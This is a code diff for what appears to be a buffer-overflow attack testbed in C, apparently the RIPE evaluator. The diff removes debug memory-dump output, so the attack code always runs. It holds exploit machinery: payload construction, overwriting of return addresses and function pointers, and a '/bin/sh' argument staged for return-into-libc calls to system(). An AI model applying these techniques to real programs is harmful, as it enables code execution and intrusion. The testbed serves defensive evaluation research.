@@ -90,7 +90,6 @@ static struct attackme data_struct = {"AAAAAAAAAAAA",&fooz};
 //NN: Moved away of harm's way (aka overflowing buffers in the data segment)
 static char loose_change1[128];      //NN Sandwich the control vars
 static boolean output_error_msg = TRUE;
-static boolean output_debug_info = FALSE; /* Disables most effective attacks */
 static boolean has_opened_output_stream = FALSE;
 static ATTACK_FORM attack;
 static char loose_change2[128];      //NN Sandwich the control vars
@@ -135,26 +134,8 @@ int main(int argc, char **argv) {
   attack.location = STACK;
   attack.function = MEMCPY;
 
-  /* If no output option set default */
-  if(!has_opened_output_stream && output_debug_info) {
-    //    output_stream = stdout;
-    output_stream = fopen(DEBUG_MEMDUMP, "a+");
-    if(output_stream == NULL) {
-      if(output_error_msg) {
-        printf("Error: Could not open file \"debug.txt\"\n");
-      }
-    } else {
-      has_opened_output_stream = TRUE;
-    }
-  }
-
   setenv("param_to_system", "/bin/sh", 1);
   setenv("param_to_creat", "/tmp/rip-eval/f_xxxx",1); //NN
-
-  if(output_debug_info) {
-    printf("getenv(\"param_to_system\") = %x\n", getenv("param_to_system"));
-    printf("&system = %p\n", &system);
-  }
 
   /* Check if attack form is possible */
   if(is_attack_possible()) {
@@ -276,10 +257,6 @@ void perform_attack(FILE *output_stream,
   MEM_DUMP mem_dump1[DEFAULT_DUMP_SIZE];
   MEM_DUMP mem_dump2[DEFAULT_DUMP_SIZE];
   MEM_DUMP payload_dump[DEFAULT_DUMP_SIZE];
-
-  if(output_debug_info) {
-    dump_start_addr = format_string_buf;
-  } /* DEBUG */
 
   /* Check that malloc went fine */
   if(heap_buffer1 == NULL || heap_buffer2 == NULL) {
@@ -772,16 +749,6 @@ void perform_attack(FILE *output_stream,
   /* start filling the buffer from that first byte                        */
   buffer[0] = '\0';
 
-  if(output_debug_info) {
-    fprintf(output_stream, "&target_addr = %lx, target_addr = %lx, *target_addr = %lx\n",
-      (long)&target_addr, (long)target_addr, *(long *)target_addr);
-    fprintf(output_stream, "&stack_mem_ptr = %lx, stack_mem_ptr = %lx, *stack_mem_ptr = %lx\n",
-      (long)&stack_mem_ptr, (long)stack_mem_ptr, (long)*stack_mem_ptr);
-    fprintf(output_stream, "&buffer = %lx, buffer = %lx\n",
-      (long)&buffer, (long)buffer);
-  }
-
-
   /*****************/
   /* Build payload */
   /*****************/
@@ -824,24 +791,6 @@ void perform_attack(FILE *output_stream,
      payload.overflow_ptr,
      sizeof(long));
   }
-
-  if(output_debug_info) {
-    save_memory(payload_dump, payload.buffer,
-    ((payload.size / sizeof(long)) +
-     (payload.size % sizeof(long))));
-    
-    // Output some addresses and values
-    fprintf(output_stream, "Address to payload->buffer: %lx\n", &(payload.buffer));
-    fprintf(output_stream, "Value of payload->buffer: %lx\n", (payload.buffer));
-    fprintf(output_stream, "Address to overflow buffer: %lx\n", (long)buffer);
-    fprintf(output_stream, "Value of overflow buffer: %lx\n", *buffer);
-    fprintf(output_stream, "payload.overflow_ptr: %lx\n", payload.overflow_ptr);
-    // Output payload info
-    print_payload_info(output_stream, &payload);
-    // Save stack before overflow
-    save_memory(mem_dump1, dump_start_addr, DEFAULT_DUMP_SIZE);
-  } /* DEBUG */
-
 
   /****************************************/
   /* Overflow buffer with chosen function */
@@ -985,9 +934,6 @@ void perform_attack(FILE *output_stream,
       exit(1);
       break;
     }
-    if(output_debug_info) {
-      fprintf(output_stream, "*(long *)target_addr = %lx, *(long *)(*(long *)target_addr) = %lx\n\n", *(long *)target_addr, *(long *)(*(long *)target_addr));
-    }
     /* @todo Write payload.overflow_ptr to overwritten pointer */
     break;
   default:
@@ -1004,11 +950,10 @@ void perform_attack(FILE *output_stream,
   /* Send "/bin/sh" as parameter since it might be a return-   */
   /* into-libc attack calling system()                         */
   /*************************************************************/
-  if(!output_debug_info) {
-    // Only do this if not in debug mode since
-    // an attack effectively destroys the memory
-    // structures needed to inspect functionality
-    switch(attack.code_ptr) {
+  // Only do this if not in debug mode since
+  // an attack effectively destroys the memory
+  // structures needed to inspect functionality
+  switch(attack.code_ptr) {
     case RET_ADDR:
     case OLD_BASE_PTR:
       /* Just let the function carry on and eventually return */
@@ -1058,18 +1003,17 @@ void perform_attack(FILE *output_stream,
       break;
 
     case STRUCT_FUNC_PTR_STACK:
-  (*stack_struct.func_ptr)("/tmp/rip-eval/f_xxxx",700);
-  break;
-  case STRUCT_FUNC_PTR_HEAP:
-  (*heap_struct->func_ptr)("/tmp/rip-eval/f_xxxx",700);
-  break;
-  case STRUCT_FUNC_PTR_DATA:
-  (*data_struct.func_ptr)("/tmp/rip-eval/f_xxxx",700);
-  break;
-  case STRUCT_FUNC_PTR_BSS:
-  (*bss_struct.func_ptr)("/tmp/rip-eval/f_xxxx",700);
-  break;
-
+      (*stack_struct.func_ptr)("/tmp/rip-eval/f_xxxx",700);
+      break;
+    case STRUCT_FUNC_PTR_HEAP:
+      (*heap_struct->func_ptr)("/tmp/rip-eval/f_xxxx",700);
+      break;
+    case STRUCT_FUNC_PTR_DATA:
+      (*data_struct.func_ptr)("/tmp/rip-eval/f_xxxx",700);
+      break;
+    case STRUCT_FUNC_PTR_BSS:
+      (*bss_struct.func_ptr)("/tmp/rip-eval/f_xxxx",700);
+      break;
 
     default:
       if(output_error_msg) {
@@ -1077,24 +1021,7 @@ void perform_attack(FILE *output_stream,
       }
       exit(1);
       break;
-    }
   }
-
-  
-  if(output_debug_info) {
-    save_memory(mem_dump2, dump_start_addr, DEFAULT_DUMP_SIZE);
-    printf("output_stream = %p, &output_stream 0 %p\n\n",
-     output_stream, &output_stream);
-    print_three_memory_dumps(output_stream,
-           mem_dump1, mem_dump2, payload_dump,
-           DEFAULT_DUMP_SIZE);
-    fflush(output_stream);
-    if(output_error_msg) {
-      printf("Dumped memory to stream\n");
-    }
-
-    sleep(1);
-  } /* DEBUG */
 }
 
 
